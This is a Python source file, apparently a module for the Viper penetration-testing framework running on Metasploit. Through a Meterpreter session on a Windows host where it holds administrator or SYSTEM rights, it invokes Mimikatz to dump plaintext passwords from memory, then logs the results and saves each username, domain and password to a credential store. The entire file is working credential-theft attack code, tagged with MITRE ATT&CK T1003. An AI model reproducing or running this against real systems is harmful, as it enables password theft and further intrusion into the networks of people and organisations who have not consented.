# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

#
#

from PostModule.lib.Credential import Credential
from PostModule.lib.Host import Host
from PostModule.lib.ModuleTemplate import TAG2CH, PostMSFRawModule


class PostModule(PostMSFRawModule):
    NAME = "获取Windows内存密码"
    DESC = "使用Mimikatz抓取内存中的windows用户明文密码,并保存到凭证列表.\n"
    REQUIRE_SESSION = True
    MODULETYPE = TAG2CH.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1003"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1003/"]
    AUTHOR = "Viper"

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.type = "post"
        self.mname = "windows/gather/credentials/mimikatz_api"

    def check(self):
        """执行前的检查函数"""
        from PostModule.lib.Session import Session
        session = Session(self._sessionid)

        if session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter"
        if session.is_admin is not True:
            return False, "此模块需要管理员权限,请尝试提权"
        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_status("获取密码列表:")

            for record in data:
                password = record.get('password')
                if password is '' or password.find('n.a.') > 0 or len(password) > 100:
                    continue
                print_str = "类型:{} 域:{} 用户名:{} 密码:{}".format(record.get('type'),
                                                             record.get('domain').replace('\x00', ''),
                                                             record.get('user'), record.get('password'), )
                self.log_good(print_str)
                tag = {'domain': record.get('domain'), 'type': 'Password'}
                Credential.add_credential(username=record.get('user'), password=record.get('password'),
                                          password_type='windows', tag=tag,
                                          source_module=self.NAME, host_ipaddress=Host.get_ipaddress(self._hid),
                                          desc='')

        else:
            print_str = "运行失败:{}".format(message)
            self.log_error(print_str)
        self.log_status("密码已存储,可以到<数据管理>-<凭证>页面查看")
